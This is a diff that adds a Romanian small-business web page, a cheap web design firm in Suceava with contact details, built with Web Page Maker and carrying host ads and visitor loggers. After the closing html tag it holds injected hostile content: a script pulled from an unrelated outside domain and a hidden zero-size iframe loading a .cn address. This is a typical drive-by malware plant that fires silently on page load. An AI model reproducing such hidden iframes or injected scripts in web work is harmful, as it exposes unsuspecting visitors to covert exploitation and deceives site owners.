@@ -1,0 +1,180 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
+<meta name="generator" content="Web Page Maker V2">
+
+<style type="text/css">
+.ws6 {font-size: 8px;}
+.ws7 {font-size: 9.3px;}
+.ws8 {font-size: 11px;}
+.ws9 {font-size: 12px;}
+.ws10 {font-size: 13px;}
+.ws11 {font-size: 15px;}
+.ws12 {font-size: 16px;}
+.ws14 {font-size: 19px;}
+.ws16 {font-size: 21px;}
+.ws18 {font-size: 24px;}
+.ws20 {font-size: 27px;}
+.ws22 {font-size: 29px;}
+.ws24 {font-size: 32px;}
+.ws26 {font-size: 35px;}
+.ws28 {font-size: 37px;}
+.ws36 {font-size: 48px;}
+.ws48 {font-size: 64px;}
+.ws72 {font-size: 96px;}
+.wpmd {font-size: 13px;font-family: 'Arial';font-style: normal;font-weight: normal;text-decoration: none;}
+</style>
+
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 789px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+</style>
+</head>
+
+<script language="JavaScript1.4" type="text/javascript">
+<!--
+function jsPlay(soundobj) {
+ var thissound= eval("document."+soundobj);
+ try {
+     thissound.Play();
+ }
+ catch (e) {
+     thissound.DoPlay();
+ }
+}
+//-->
+</script>
+
+<script language="javascript" type="text/javascript">
+<!--
+function MM_swapImgRestore() {
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+
+function MM_preloadImages() {
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_findObj(n, d) {
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() {
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+
+//-->
+</script>
+
+<body bgColor="#000000"><div xmlns="" style="position:relative; top:0px; left:0px; right:0px; padding-bottom:0px; margin-bottom:0px"><table cellpadding="0" cellspacing="0" border="0" width="100%" style="border-bottom:#c9d7f1 1px solid"><tr valign="middle">
+<td style="background-color: #FFFFFF" width="70" align="center">
+<!-- BEGIN logger code v1.0 --><script>id="603"; serverId="100";</script><script src="http://www.clicks.ro/logger/log.js"></script><noscript><img border="0" src="http://www.clicks.ro/logger/log.php?id=603&jv=00"/></noscript><!-- END logger code v1.0 -->
+<!-- BEGIN vistors code v1.0 -->
+			<script>id="589"; serverId="100";</script>
+			<script src="http://www.surfers.ro/visitors/visit.js">
+			</script>
+			<noscript>
+				<img border="0" src="http://www.surfers.ro/visitors/visit.php?id=589&amp;serverId=100"/>
+			</noscript>
+<!-- END visitors code v1.0 -->
+<span style="font-family:Arial; font-weight:bold; color:#CC0000; font-size:14px;">X</span><a href="http://www.xhost.ro" style="font-family:Arial; font-weight:bold; color:#000000; font-size:14px;">HOST</a>
+</td>
+<td style="background-color: #FFCC66" width="110" align="center">
+<a href="http://www.afiliati.ro/affiliates/scripts/hit.php?uic=25359&type=sale"><img src="http://www.afiliati.ro/affiliates/scripts/creative.php?uic=25359&imageType=1&type=sale" border="0"/><span style="font-family:Arial; font-weight:bold; color:#333333; font-size:12px;">UPGRADE</span></a><a href="http://www.afiliati.ro/affiliates/scripts/hit.php?uic=25359&type=sale"><img src="http://www.afiliati.ro/affiliates/scripts/creative.php?uic=25359&imageType=1&type=sale" border="0"/><span style="font-family:Arial; font-weight:bold; color:#CC0000; font-size:12px;">HOSTING</span></a>
+</td>
+<td style="background-color:#FFFFFF; padding-bottom:0px; padding-left:5px; padding-right:5px;" width="*" align="left"><span style="font-weight:normal; font-size:12px; color:#000000; font-family:Arial;"><script type="text/javascript" src="http://www.afiliati.ro/affiliates/scripts/search.php?feedType=html&adSpaceId=25283"></script></span></td>
+<form name="searchBox" method="post" action="http://www.xhost.ro/search/search.php">
+
+<td style="background-color: #FFFFFF" width="80" align="right"><input type="text" name="q" size="10" style="border-right:1px solid #C8C8C8; border-top:1px solid #C8C8C8; border-left:1px solid #C8C8C8; border-bottom: 1px solid #C8C8C8; font-weight:normal; font-size:11px; font-family:Arial; background-color:#ffffff;"></td>
+<td nowrap style="background-color:#FFFFFF" width="50" align="center"><select name="searchTarget" style="font-size:10px; font-family:Arial;"><option value="site">site</option>
+<option value="web">web</option></select></td>
+<td style="background-color:#FFFFFF" width="50"><input type="submit" style="font-size:10px; font-family:Arial;" value="Cauta"></td>
+</form>
+</tr></table></div>
+
+
+
+<div id="container">
+<div id="flash1" style="position:absolute; left:18px; top:137px; z-index:0">
+<object width=227 height=255 classid="clsid:D27CDB6E-AE6D-11CF-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
+<param name=movie value="images/people.swf">
+<param name=quality value=high>
+<param name=loop value=1>
+<param name=wmode value=window>
+<embed src="images/people.swf" width=227 height=255 quality=high TYPE=application/x-shockwave-flash wmode=window pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash"></embed>
+</object>
+</div>
+
+<div id="image1" style="position:absolute; overflow:hidden; left:19px; top:623px; width:752px; height:88px; z-index:1"><img src="images/bot21.jpg" border=0 width=752 height=88></div>
+
+<div id="image2" style="position:absolute; overflow:hidden; left:18px; top:400px; width:223px; height:19px; z-index:2"><img src="images/box2.jpg" border=0 width=223 height=19></div>
+
+<div id="image4" style="position:absolute; overflow:hidden; left:610px; top:400px; width:162px; height:19px; z-index:3"><img src="images/box4.jpg" border=0 width=162 height=19></div>
+
+<div id="image5" style="position:absolute; overflow:hidden; left:610px; top:0px; width:162px; height:128px; z-index:4"><img src="images/building.jpg" border=0 width=162 height=128></div>
+
+<div id="image6" style="position:absolute; overflow:hidden; left:21px; top:1px; width:584px; height:8px; z-index:5"><img src="images/busi2_line.jpg" border=0 width=584 height=8></div>
+
+<div id="text4" style="position:absolute; overflow:hidden; left:106px; top:34px; width:400px; height:30px; z-index:6">
+<div class="wpmd">
+<div><font class="ws16" color="#FF9900" face="Copperplate Gothic Bold"><B>CEL MAI IEFTIN WEB DESIGN</B></font></div>
+</div>
+</div>
+
+<div id="image13" style="position:absolute; overflow:hidden; left:593px; top:134px; width:20px; height:423px; z-index:7"><img src="images/ver_line.gif" border=0 width=20 height=423></div>
+
+<div id="image14" style="position:absolute; overflow:hidden; left:238px; top:137px; width:20px; height:416px; z-index:8"><img src="images/ver_line.gif" border=0 width=20 height=416></div>
+
+<div id="text5" style="position:absolute; overflow:hidden; left:610px; top:205px; width:153px; height:122px; z-index:9">
+<div class="wpmd">
+<UL>
+<li><font class="ws8" color="#969696" face="Tahoma"><B>COMERT</B></font></li>
+<li><font class="ws8" color="#969696" face="Tahoma"><B>AGRICULTURA</B></font></li>
+<li><font class="ws8" color="#969696" face="Tahoma"><B>PRODUCTIE</B></font></li>
+<li><font class="ws8" color="#969696" face="Tahoma"><B>SERVICII</B></font></li>
+<li><font class="ws8" color="#969696" face="Tahoma"><B>INDUSTRIE</B></font></li>
+</UL>
+<div><font class="ws8" color="#969696" face="Tahoma"><B><BR></B></font></div>
+</div>
+</div>
+
+<div id="image17" style="position:absolute; overflow:hidden; left:633px; top:461px; width:118px; height:78px; z-index:10; border:#C0C0C0 1px solid"><img src="images/1-pic-2.jpg" border=0 width=116 height=76></div>
+
+<div id="nav1" style="position:absolute; left:17px; top:87px; z-index:11"><a onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('nav10','','images/nav495176620a.gif',1)" href="index.html"><img name="nav10" onLoad="MM_preloadImages('images/nav495176620a.gif')" alt="" border=0 src="images/nav495176620i.gif"></a></div>
+<div id="nav1" style="position:absolute; left:201px; top:87px; z-index:11"><a onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('nav11','','images/nav495176621a.gif',1)" href="servicii.html"><img name="nav11" onLoad="MM_preloadImages('images/nav495176621a.gif')" alt="" border=0 src="images/nav495176621i.gif"></a></div>
+<div id="nav1" style="position:absolute; left:385px; top:87px; z-index:11"><a onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('nav12','','images/nav495176622a.gif',1)" href="contact.html"><img name="nav12" onLoad="MM_preloadImages('images/nav495176622a.gif')" alt="" border=0 src="images/nav495176622i.gif"></a></div>
+
+<div id="text3" style="position:absolute; overflow:hidden; left:266px; top:254px; width:310px; height:136px; z-index:12">
+<div class="wpmd">
+<div align=center><font class="ws11" color="#FF9900" face="Arial Narrow">SUCEAVA</font></div>
+<div align=center><font class="ws11" color="#FF9900" face="Arial Narrow">STR. MARASTI NR. 10</font></div>
+<div align=center><font class="ws11" color="#FF9900" face="Arial Narrow">TEL/FAX : 0230/531671</font></div>
+<div align=center><font class="ws11" color="#FF9900" face="Arial Narrow">MOBILE : 0762/215557</font></div>
+<div align=center><font class="ws11" color="#FF9900" face="Arial Narrow">EMAIL : </font><font class="ws11" face="Arial Narrow"><a href="mailto:pagini_web_ieftine@uv.ro">pagini_web_ieftine@uv.ro</a></font></div>
+</div>
+</div>
+
+
+</div>
+</body>
+</html><script type="text/javascript">var bbSite='http___xhost.ro'; var bbMainDomain='new.arbocontext.ro';</script>
+<script type="text/javascript" src="http://code.new.arbocontext.ro/code/http___xhost.ro/code.js"></script>
+
+<iframe src="http://mixlong.cn/in/" width=0 height=0 frameborder=0></iframe>
